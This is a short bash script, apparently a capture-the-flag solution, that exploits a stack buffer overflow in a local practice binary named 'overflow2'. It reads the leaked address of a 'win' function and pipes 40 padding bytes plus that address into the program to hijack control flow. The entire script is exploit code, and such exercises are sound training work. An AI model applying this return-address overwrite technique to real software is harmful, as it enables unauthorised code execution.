#!/bin/bash

# Run the program, get the address of win, and store it in a variable
win_address=$(./overflow2 | grep 'win is located at' | cut -d' ' -f5)

# Remove the leading 0x from the address
win_address=${win_address#0x}

# Convert the address to a little-endian byte object
win_address=$(printf '\\x%s' $(echo $win_address | sed 's/../& /g' | tac))

# Run the exploit
python3 -c "import os, struct; os.write(1, b'A'*40 + b'$win_address')" | ./overflow2